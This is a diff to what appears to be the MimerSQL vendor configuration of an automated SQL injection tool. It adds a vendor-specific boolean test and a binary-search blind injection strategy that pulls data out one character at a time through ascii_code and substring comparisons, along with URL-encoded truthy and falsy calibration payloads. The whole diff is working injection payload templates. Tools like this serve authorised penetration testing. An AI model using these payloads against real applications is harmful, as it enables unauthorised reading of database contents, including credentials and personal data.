@@ -123,6 +123,35 @@ strategy:
     - mimersql
    orderByErrorMessage:
     - ORDER BY clause invalid because it includes an integer which does not identify a column of the result table
+   vendorSpecific: case when ${test} then builtin.begins_word('a','a') else false end=true
+
+ binary:
+  test:
+   # ascii_code required as char comparison range is lowercase only
+   bin: |
+    ascii_code(substring(
+        (${injection}),
+        ${window.char},
+        1
+    ))
+    %3E%3Dascii_code('${mid}')
+   truthyBin:
+    - "'a'%3E%3D'a'"
+    - "'a'%3E%3D'A'"
+    - "'a'%3E%3D'0'"
+    - "'b'%3E%3D'a'"
+    - "'b'%3E%3D'B'"
+    - "'1'%3E%3D'0'"
+   falsyBin:
+    - "'a'%3E%3D'b'"
+    - "'A'%3E%3D'a'"
+    - "'B'%3E%3D'b'"
+    - "'B'%3E%3D'a'"
+    - "'0'%3E%3D'A'"
+    - "'0'%3E%3D'1'"
+  modeAnd: and
+  modeOr: or
+  blind: ${binary.mode} ${test}
 
  union:
   indices: union select ${result_range} from (${indice_unique}) b
